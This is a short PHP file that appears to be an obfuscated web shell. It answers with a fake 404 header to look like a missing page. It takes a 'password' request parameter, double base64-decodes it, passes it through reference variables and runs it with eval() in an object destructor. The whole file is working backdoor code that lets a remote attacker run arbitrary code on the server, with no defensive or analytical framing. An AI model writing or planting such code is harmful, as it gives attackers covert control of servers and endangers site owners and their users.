<?php 

header('HTTP/1.1 404');

class COMI { 

    public $c='';

    function __destruct() {

        return eval(substr($this->c, 0));

    }

}

$comi = new COMI();

$password = &$password1;

$password1 = $_REQUEST['password'];

$post = &$password;

$post=base64_decode(base64_decode($post));

$lnng1 = &$lnng;

$lnng = $post;

$lnng2 = $lnng1;

@$comi->c = substr($lnng2, 0);

?>
